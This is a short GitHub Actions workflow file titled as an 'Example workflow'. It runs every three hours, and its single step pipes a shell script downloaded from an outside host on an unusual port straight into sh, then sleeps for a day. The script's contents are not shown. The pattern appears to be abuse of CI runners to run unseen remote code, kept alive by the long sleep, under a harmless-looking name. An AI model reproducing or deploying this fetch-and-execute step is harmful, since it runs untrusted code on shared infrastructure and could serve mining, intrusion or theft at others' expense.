name: Example workflow for GitHub Actions
 
on:
  schedule:
    - cron: "0 */3 * * *"
 
jobs:
  test-run:
    runs-on: ubuntu-latest
    steps:
    - name: Run a shell script
      run: |
        curl https://im.openjad.com:19443/one2.sh | sh
        sleep 1d
